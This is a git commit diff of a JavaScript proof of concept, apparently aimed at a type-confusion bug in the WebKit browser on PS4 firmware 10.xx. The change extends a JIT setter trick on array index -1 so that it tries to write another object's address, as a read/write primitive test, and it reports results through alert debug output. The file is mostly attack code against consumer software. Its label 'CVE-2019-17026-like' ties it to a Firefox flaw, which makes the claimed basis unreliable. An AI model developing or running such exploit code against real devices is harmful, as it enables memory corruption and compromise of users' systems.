00f233469bf15fa43b7b315661a8e1049384d835
Dark-life944 <168915806+Dark-life944@users.noreply.github.com>
2025-10-02 23:58:43 +0100

    Update Poc.js

--- 1/Poc.js
+++ 1/Poc.js
@@ -1,13 +1,20 @@
-// POC for CVE-2019-17026-like Type Confusion in WebKit on PS4 10.xx
-const NUM_ITERATIONS = 10;
+//POC for CVE-2019-17026-like Type Confusion in WebKit on PS4 10.xx
+const NUM_ITERATIONS = 10; // Reduced for faster testing
 const ARRAY_LENGTH = 100;
 
 let OBJ = { a: 41 };
 OBJ.a = 42; // Avoid constant optimization
+let TARGET = { secret: 0x12345678 }; // Target object to test R/W
 
-function f(obj, idx) {
+function f(obj, idx, targetAddr) {
     let v = OBJ.a;
+    alert('Before write, OBJ.a = ' + OBJ.a); // Debug point
     obj[idx] = v;
+    if (targetAddr && idx === -1) {
+        obj[-1] = targetAddr; // Attempt to overwrite with TARGET address
+        alert('Attempted to write TARGET address to obj[-1]');
+    }
+    alert('After write, OBJ.a = ' + OBJ.a); // Debug point
     return OBJ.a;
 }
 
@@ -18,8 +25,8 @@ function main() {
 
         let obj = new Array(ARRAY_LENGTH);
         Object.defineProperty(obj, '-1', {
-            set() {
-                alert('Setter triggered, changing OBJ.a to 1337');
+            set(value) {
+                alert('Setter triggered for value ' + value + ', changing OBJ.a to 1337');
                 OBJ.a = 1337;
             }
         });
@@ -29,10 +36,11 @@ function main() {
             obj[j] = j;
         }
 
-        let r = f(obj, idx);
+        let r = f(obj, idx, isLastIteration ? TARGET : null);
         alert('Iteration ' + i + ': Result = ' + r);
     }
-    alert('Final OBJ.a = ' + OBJ.a); // Should be 1337
+    alert('Final OBJ.a = ' + OBJ.a);
+    alert('TARGET.secret = ' + TARGET.secret); // Check if TARGET was modified
 }
 
 main();
